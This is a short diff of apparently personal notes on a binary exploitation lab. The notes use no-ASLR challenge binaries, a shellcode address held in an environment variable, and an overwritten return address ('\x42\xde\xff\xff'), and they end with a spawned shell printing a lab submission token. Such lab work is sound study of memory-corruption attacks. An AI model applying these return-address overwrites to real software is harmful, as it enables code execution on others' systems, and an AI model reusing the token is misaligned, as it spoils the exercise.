@@ -154,7 +154,7 @@ SC is at `0xffffde4f` but that includes the `SC=` prefix (3 bytes)
 
 ![[Pasted image 20260701191138.png]]
 
-# Now trying this on concat_noaslr
+# Now trying this on oddecho_noaslr
 
 this has to be outside gdb 
 
@@ -190,3 +190,5 @@ ret_addr = b"\x42\xde\xff\xff"
 sh-5.3$ win
 Congratulations! Submit this token: 22-z2dFw2LY8DGDDmo9ljntEg-22
 22-z2dFw2LY8DGDDmo9ljntEg-22
+
+
